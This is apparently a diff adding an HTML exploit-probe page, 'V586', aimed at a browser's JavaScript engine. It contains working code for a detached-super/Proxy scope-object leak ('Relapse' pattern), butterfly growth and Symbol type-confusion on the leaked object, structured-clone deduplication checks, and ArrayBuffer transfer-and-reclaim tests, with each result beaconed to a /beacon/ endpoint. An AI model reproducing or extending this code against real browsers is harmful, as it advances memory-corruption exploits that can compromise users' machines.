@@ -1,0 +1,292 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>V586</title></head>
+<body><pre id="out">V586 — Relapse scope leak + clone corruption test</pre>
+<script>
+'use strict';
+var O=document.getElementById('out');
+function say(s){O.textContent+='\n'+s;}
+function bk(tag,body){
+  var u='/beacon/V586-'+tag+'?d='+encodeURIComponent(String(body).slice(0,800))+'&t='+Date.now();
+  try{new Image().src=u;}catch(e){}
+  setTimeout(function(){try{new Image().src=u+'&r=2';}catch(e){}},200);
+  setTimeout(function(){try{new Image().src=u+'&r=3';}catch(e){}},600);
+}
+
+bk('BOOT','v586-relapse-scope-leak-test');
+say('V586: Relapse scope leak + clone test\n');
+
+/* ===== TEST 1: Exact Relapse leakScopeObject pattern ===== */
+var scopeResult = 'NONE';
+try {
+  var LeakerClass = eval("(function(){" +
+    "'use strict';" +
+    "class Leaker { leak() { return super.foo; } }" +
+    "Leaker.prototype.__proto__ = new Proxy({}, {" +
+    "  get: function(target, property, receiver) { return receiver; }" +
+    "});" +
+    "return Leaker;" +
+  "})()");
+
+  var leakFn = LeakerClass.prototype.leak;
+  var ScopeLeaked = (function() { return leakFn(); })();
+
+  if (ScopeLeaked !== null && ScopeLeaked !== undefined) {
+    scopeResult = 'GOT-OBJECT';
+    scopeResult += ',type=' + typeof ScopeLeaked;
+
+    try {
+      scopeResult += ',ctor=' + (ScopeLeaked.constructor ? ScopeLeaked.constructor.name : 'none');
+    } catch(e) { scopeResult += ',ctor=ERR'; }
+
+    try {
+      var keys = Object.keys(ScopeLeaked);
+      scopeResult += ',keys=' + keys.length;
+    } catch(e) { scopeResult += ',keys=ERR:' + e.name; }
+
+    try {
+      var props = Object.getOwnPropertyNames(ScopeLeaked);
+      scopeResult += ',props=' + props.length;
+      if (props.length > 0 && props.length < 20) {
+        scopeResult += ',pnames=' + props.slice(0,10).join('+');
+      }
+    } catch(e) { scopeResult += ',props=ERR:' + e.name; }
+
+    try {
+      var proto = Object.getPrototypeOf(ScopeLeaked);
+      scopeResult += ',proto=' + (proto === null ? 'null' : typeof proto);
+    } catch(e) { scopeResult += ',proto=ERR:' + e.name; }
+
+    try {
+      scopeResult += ',str=' + String(ScopeLeaked).slice(0, 50);
+    } catch(e) { scopeResult += ',str=ERR:' + e.name; }
+
+    try {
+      ScopeLeaked.testProp123 = 42;
+      scopeResult += ',writable=' + (ScopeLeaked.testProp123 === 42);
+    } catch(e) { scopeResult += ',writable=ERR:' + e.name; }
+
+    try {
+      ScopeLeaked[0] = 1.1;
+      ScopeLeaked[1] = 2.2;
+      scopeResult += ',indexed=' + (ScopeLeaked[0] === 1.1);
+    } catch(e) { scopeResult += ',indexed=ERR:' + e.name; }
+  } else {
+    scopeResult = 'NOT-OBJECT,val=' + String(ScopeLeaked) + ',type=' + typeof ScopeLeaked;
+  }
+} catch(e) {
+  scopeResult = 'ERR:' + e.name + ':' + e.message.slice(0, 100);
+}
+bk('SCOPE', scopeResult);
+say('1. Scope leak: ' + scopeResult);
+
+/* ===== TEST 2: Simpler detached super variants ===== */
+var scope2Result = 'NONE';
+try {
+  var result2a = eval("(function(){" +
+    "'use strict';" +
+    "class A { m() { return super.x; } }" +
+    "A.prototype.__proto__ = new Proxy({}, {get:function(t,p,r){return r;}});" +
+    "var fn = A.prototype.m;" +
+    "return (function(){ return fn(); })();" +
+  "})()");
+  scope2Result = 'v2a=' + (result2a !== undefined ? typeof result2a + ':' + String(result2a).slice(0,40) : 'undef');
+} catch(e) {
+  scope2Result = 'v2a=ERR:' + e.name + ':' + e.message.slice(0,60);
+}
+
+try {
+  var result2b = eval("(function(){" +
+    "'use strict';" +
+    "class B { m() { return super['toString']; } }" +
+    "B.prototype.__proto__ = new Proxy({}, {get:function(t,p,r){return r;}});" +
+    "var fn = B.prototype.m;" +
+    "return typeof (function(){return fn();})();" +
+  "})()");
+  scope2Result += ',v2b=' + result2b;
+} catch(e) {
+  scope2Result += ',v2b=ERR:' + e.name;
+}
+
+try {
+  var captured3 = null;
+  eval("(function(){" +
+    "'use strict';" +
+    "class C { m() { return super.z; } }" +
+    "C.prototype.__proto__ = new Proxy({}, {" +
+    "  get:function(t,p,r){ captured3=r; return undefined; }" +
+    "});" +
+    "var fn = C.prototype.m;" +
+    "(function(){fn();})();" +
+  "})()");
+  if (captured3 !== null) {
+    scope2Result += ',v2c=CAPTURED:' + typeof captured3;
+    try {
+      scope2Result += ':keys=' + Object.getOwnPropertyNames(captured3).length;
+    } catch(e) {}
+  } else {
+    scope2Result += ',v2c=NULL';
+  }
+} catch(e) {
+  scope2Result += ',v2c=ERR:' + e.name;
+}
+
+bk('SCOPE2', scope2Result);
+say('2. Alt scope: ' + scope2Result);
+
+/* ===== TEST 3: Can we grow butterfly on leaked object? ===== */
+var growResult = 'NONE';
+try {
+  var LeakerG = eval("(function(){" +
+    "'use strict';" +
+    "class Leaker { leak() { return super.foo; } }" +
+    "Leaker.prototype.__proto__ = new Proxy({}, {get:function(t,p,r){return r;}});" +
+    "return Leaker;" +
+  "})()");
+  var leakG = LeakerG.prototype.leak;
+  var scopeG = (function(){return leakG();})();
+
+  if (scopeG && typeof scopeG === 'object') {
+    growResult = 'got-scope';
+    try {
+      for (var i = 0; i < 512; i++) {
+        scopeG['p' + i] = i;
+      }
+      growResult += ',named512=OK';
+    } catch(e) {
+      growResult += ',named=ERR@' + i + ':' + e.name;
+    }
+    try {
+      for (var i = 0; i < 8; i++) {
+        scopeG[i] = i * 1.1;
+      }
+      growResult += ',indexed8=' + scopeG[0] + '/' + scopeG[7];
+    } catch(e) {
+      growResult += ',indexed=ERR:' + e.name;
+    }
+  } else {
+    growResult = 'no-scope(' + typeof scopeG + ')';
+  }
+} catch(e) {
+  growResult = 'ERR:' + e.name + ':' + e.message.slice(0, 80);
+}
+bk('GROW', growResult);
+say('3. Grow butterfly: ' + growResult);
+
+/* ===== TEST 4: Symbol.prototype.toString on scope ===== */
+var symScopeResult = 'NONE';
+try {
+  var LeakerS = eval("(function(){" +
+    "'use strict';" +
+    "class Leaker { leak() { return super.foo; } }" +
+    "Leaker.prototype.__proto__ = new Proxy({}, {get:function(t,p,r){return r;}});" +
+    "return Leaker;" +
+  "})()");
+  var leakS = LeakerS.prototype.leak;
+  var scopeS = (function(){return leakS();})();
+
+  if (scopeS && typeof scopeS === 'object') {
+    symScopeResult = 'got-scope';
+    try {
+      var symStr = Symbol.prototype.toString.call(scopeS);
+      symScopeResult += ',toString=OK(' + symStr.length + ')';
+      if (symStr.length > 20) {
+        symScopeResult += ',first20hex=';
+        for (var i = 0; i < 20 && i < symStr.length; i++) {
+          symScopeResult += symStr.charCodeAt(i).toString(16) + ',';
+        }
+      } else {
+        symScopeResult += ',str=' + symStr;
+      }
+    } catch(e) {
+      symScopeResult += ',toString=ERR:' + e.name + ':' + e.message.slice(0,40);
+    }
+
+    try {
+      var descr = Symbol.prototype.description;
+      if (descr !== undefined) {
+        var getter = Object.getOwnPropertyDescriptor(Symbol.prototype, 'description');
+        if (getter && getter.get) {
+          var d = getter.get.call(scopeS);
+          symScopeResult += ',desc=' + (d === undefined ? 'undef' : typeof d + '(' + String(d).length + ')');
+        }
+      }
+    } catch(e) {
+      symScopeResult += ',desc=ERR:' + e.name;
+    }
+  } else {
+    symScopeResult = 'no-scope';
+  }
+} catch(e) {
+  symScopeResult = 'ERR:' + e.name + ':' + e.message.slice(0, 80);
+}
+bk('SYM-SCOPE', symScopeResult);
+say('4. Symbol on scope: ' + symScopeResult);
+
+/* ===== TEST 5: history.replaceState clone dedup with functions ===== */
+var cloneResult = 'NONE';
+try {
+  var shared = {x: 42, y: 'test'};
+  var graph = new Array(0x100);
+  graph[0] = [{},{},{}];
+  graph[1] = shared;
+  graph[2] = shared;
+  graph[0xff] = -64000;
+
+  history.replaceState(graph, '');
+  var clone = history.state;
+
+  if (clone) {
+    cloneResult = 'len=' + clone.length;
+    cloneResult += ',same12=' + (clone[1] === clone[2]);
+    cloneResult += ',c1x=' + (clone[1] ? clone[1].x : 'N');
+    cloneResult += ',c2y=' + (clone[2] ? clone[2].y : 'N');
+
+    if (clone[1] === clone[2]) {
+      clone[1].x = 999;
+      cloneResult += ',prop=' + (clone[2].x === 999);
+    }
+    cloneResult += ',tail=' + clone[0xff];
+  } else {
+    cloneResult = 'state=null';
+  }
+} catch(e) {
+  cloneResult = 'ERR:' + e.name + ':' + e.message.slice(0, 80);
+}
+bk('CLONE', cloneResult);
+say('5. Clone dedup: ' + cloneResult);
+
+/* ===== TEST 6: MC transfer + reallocation check ===== */
+var mcResult = 'NONE';
+try {
+  var mc = new MessageChannel();
+  var pad = [];
+  for (var i = 0; i < 16; i++) pad.push(new ArrayBuffer(0x10000));
+
+  var slab = new ArrayBuffer(0x80000);
+  new Uint8Array(slab).fill(0xCC);
+  mc.port1.postMessage(0, [slab]);
+  var det = (slab.byteLength === 0);
+
+  var reclaim = new ArrayBuffer(0x80000);
+  var rv = new Uint8Array(reclaim);
+  var nz = 0;
+  for (var i = 0; i < 256; i++) if (rv[i] !== 0) nz++;
+
+  mcResult = 'det=' + det + ',nz=' + nz;
+  mc.port1.close();
+  mc.port2.close();
+} catch(e) {
+  mcResult = 'ERR:' + e.name + ':' + e.message.slice(0, 80);
+}
+bk('MC', mcResult);
+say('6. MC transfer: ' + mcResult);
+
+/* ===== DONE ===== */
+setTimeout(function() {
+  bk('DONE', 'v586-complete');
+  say('\nV586 complete.');
+}, 2000);
+</script>
+</body></html>
